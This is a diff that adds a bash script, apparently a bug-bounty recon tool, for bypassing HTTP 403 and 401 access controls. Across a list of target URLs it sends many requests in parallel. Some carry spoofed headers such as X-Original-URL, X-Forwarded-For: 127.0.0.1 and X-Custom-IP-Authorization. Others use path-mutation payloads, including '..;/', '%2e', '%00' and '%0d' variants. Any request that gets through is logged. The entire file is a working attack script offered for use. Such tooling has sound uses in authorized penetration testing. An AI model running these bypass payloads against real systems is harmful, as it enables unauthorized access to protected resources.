@@ -1,0 +1,77 @@
+#!/bin/bash
+
+function bypass(){
+	p=$(echo $1  | unfurl format %p?%q)
+	url=$(echo $1  | unfurl format %s://%d )
+	echo "$1"   | httpx -H  "Referer: $1 "      -fc 403,401   -retries 2 -status-code    -location  -silent   |tee -a 403_bypass.txt && echo  "Referer: $1 " >> 403_bypass.txt
+	echo "$url" | httpx -H  "X-Original-URL: $p"  -fc 403,401 -retries 2 -status-code  -location  -silent     |  tee -a 403_bypass.txt && echo "X-Original-URL: $p" >> 403_bypass.txt
+	echo "$url" | httpx -H  "X-Rwrite-URL: $p"    -fc 403,401 -retries 2 -status-code  -location    -silent   |tee -a 403_bypass.txt && echo "X-Rwrite-URL: $p" >> 403_bypass.txt
+	echo "$1"   | httpx -H  "Content-Length: 0" -x Post    -fc 403,401  -retries 2 -status-code -location -silent |tee -a 403_bypass.txt && echo "content_length : o" >> 403_bypass.txt
+	echo "$1"   | httpx  -x Post    -fc 403,401  -retries 2                       -status-code -location  -silent |tee -a 403_bypass.txt && echo "POST " >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Client-IP: 127.0.0.1"      -fc 403,401  -retries 2 -status-code -location -silent | tee -a 403_bypass.txt && echo "X-Client-IP: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Custom-IP-Authorization: 127.0.0.1"      -fc 403,401  -retries 2 -silent -status-code  -location |tee -a 403_bypass.txt &&  echo "X-Custom-IP-Authorization: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Remote-IP: 127.0.0.1"      -fc 403,401 -retries 2  -status-code -location -silent|tee -a 403_bypass.txt && echo "X-Remote-IP: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Remote-Addr: 127.0.0.1"    -fc 403,401  -retries 2  -status-code -location -silent|tee -a 403_bypass.txt && echo "X-Remote-Addr: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Host: 127.0.0.1"           -fc 403,401 -retries 2  -status-code -location -silent|tee -a 403_bypass.txt && echo "X-Host: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Forwarded-For: 127.0.0.1"  -fc  403,401 -retries 2  -status-code -location -silent|tee -a 403_bypass.txt && echo "X-Forwarded-For: 127.0.0.1">> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Forwarded-Host: 127.0.0.1" -fc 403,401  -retries 2  -status-code  -location -silent|tee -a 403_bypass.txt && echo "X-Forwarded-Host: 127.0.0.1" >> 403_bypass.txt
+	echo "$1" | httpx -H  "X-Originating-IP: 127.0.0.1"  -fc 403,401  -retries 2 -status-code -location -silent|tee -a 403_bypass.txt && echo "X-Originating-IP: 127.0.0.1" >> 403_bypass.txt
+
+}
+
+
+function paths(){
+	base=$(echo $1 |sed "s/\/$//g")
+	payloads+=("$base.")
+        payloads+=("$base./")
+        payloads+=("$base.././")
+        payloads+=("$base*")
+        payloads+=("$base..;/")
+        payloads+=("$base;/")
+        payloads+=("$base%20")
+        payloads+=("$base%2e")
+        payloads+=("$base~")
+        payloads+=("$base%09")
+        payloads+=("$base/.")
+        payloads+=("$base/./")
+        payloads+=("$base/*")
+        payloads+=("$base..;/")
+        payloads+=("$base;/")
+        payloads+=("$base/%20")
+        payloads+=("$base/%2e")
+        payloads+=("$base/~")
+        payloads+=("$base/%09")
+        payloads+=("$base.json")
+        payloads+=("$base\\..\\.")
+        payloads+=("$base\\..\\.\\")
+        payloads+=("$base..%00/")
+        payloads+=("$base..%0d/")
+        payloads+=("$base..%5c")
+        payloads+=("$base..\\")
+        payloads+=("$base..%ff\\")
+        payloads+=("$base..%ff/")
+        payloads+=("$base%3f")
+        payloads+=("$base%26")
+        payloads+=("$base%23")
+        payloads+=("$base#")
+        payloads+=("$base?")
+        payloads+=("$base??")
+        payloads+=("$base?anything")
+
+	for i in $(echo ${payloads[*]} | xargs -n 1 );do 
+		 echo "$i"
+		 echo "$i" | httpx -retries 2  -silent -status-code -timeout 5 -fc 403,401 |tee -a 403_bypass.txt
+	done
+}
+
+
+
+
+export -f  bypass
+cat  $1 |xargs -n1 -P 20  -I{} bash -c 'bypass "$@"' _ {}
+cat 403_bypass.txt  |grep -E "^http" -A 1 >> 403_.txt
+cat 403_.txt > 403_bypass.txt
+rm 403_.txt
+
+export -f  paths
+cat  $1 |xargs -n 1 -P 20  -I {} bash -c 'paths "$@"' _ {} 
